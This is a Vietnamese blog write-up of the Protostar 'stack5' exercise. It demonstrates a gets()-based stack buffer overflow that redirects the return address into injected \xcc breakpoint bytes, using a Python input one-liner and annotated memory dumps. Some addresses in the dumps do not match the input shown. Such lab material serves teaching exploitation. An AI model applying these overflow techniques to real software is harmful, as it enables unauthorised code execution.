---
layout: post
title: stack5
---
Trong bài trước, chúng ta đã biết cách thay đổi giá trị `eip` của caller để điều hướng chương trình sau khi return từ callee.
Trong bài này, thay vì chỉ điều hướng đến những hàm có sẵn, chúng ta sẽ inject một đoạn mã vào bộ nhớ của chương trình và thực thi đoạn mã này.
Trước tiên, hãy xem source code của chương trình stack5:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
stack5 tương tự stack4. Chương trình này cũng dùng `gets` để nhập giá trị cho `buffer`. Kỹ thuật làm tràn bộ nhớ trong stack4 cũng sẽ được dùng ở đây. Sau đây là asm code của `main` trong stack5.
```asm
0x080483c4 <main+0>:    push   ebp
0x080483c5 <main+1>:    mov    ebp,esp
0x080483c7 <main+3>:    and    esp,0xfffffff0
0x080483ca <main+6>:    sub    esp,0x50
0x080483cd <main+9>:    lea    eax,[esp+0x10]
0x080483d1 <main+13>:   mov    DWORD PTR [esp],eax
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
```
`buffer` sẽ chiếm bộ nhớ `esp + 0x10` đến `esp + 0x4f`.
Như đã giải thích trong bài trước, theo sau `buffer` là padding, `ebp` và `eip` của caller.
Chúng ta sẽ giả thiết padding là 8 byte.
(điều này đúng với đại đa số các lần chạy thử.)
Như vậy, tổng số byte cần nhập vào là 64 + 8 + 4 + 4 = 80 byte.

Giá trị cần ghi đè vào `eip` của caller sẽ là một địa chỉ trên stack, và là một trong những địa chỉ từ `esp + 0x10` đến `esp + 0x5f` đã lưu 80 byte.
Trong ví dụ đầu tiên sau đây, byte `\xcc` sẽ được dùng để thử nghiệm.
Cụ thể, byte `\xcc` là một lệnh có ý nghĩa như 1 breakpoint.
Khi instruction có mã này được chạy, chương trình sẽ thông báo đã chạm đến breakpoint.
Dùng gdb để kiếm tra bộ nhớ, ta thấy giá trị của `esp` là `0xbffff750`.
Do đó, ta sẽ chọn giá trị mới cho `eip` là từ `0xbffff760` đến `0xbffff79f`.
Sau đây là 1 ví dụ:
```bash
python -c "print '\xcc' * 64 + '\x60\xf7\xff\xbf' * 4" > input.txt
stack5 < input.txt
```
Bộ nhớ sau khi gọi hàm `gets` sẽ như sau. Phân biệt bằng màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">eip của caller</span>.
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
0xbffff760:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff770:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff780:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff790:     <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>      <span style="color:aqua">0xcccccccc</span>
0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      <span style="color:orangered">0xbffff780</span>
</pre>
Sau khi được nạp giá trị mới, <span style="color:orangered">địa chỉ</span> và <span style="color:yellow">lệnh</span> sau sẽ được thực thi:
<pre class="memory">
0xbffff750:     0xbffff760      0xb7ec6165      0xbffff768      0xb7eada75
<span style="color:aqua">0xbffff760</span>:     0x<span style="color:yellow">cc</span>cccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff770:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff780:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff790:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbffff7a0:     0xbffff780      0xbffff780      0xbffff780      0xbffff780

<span style="color:aqua">0xbffff760</span>:     <span style="color:yellow">int3</span>
</pre>
## Ref
```bash
user@protostar:~$ export GREENIE=$'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888\x0a\x0d\x0a\x0d'
user@protostar:~$ stack2
you have correctly modified the variable
```
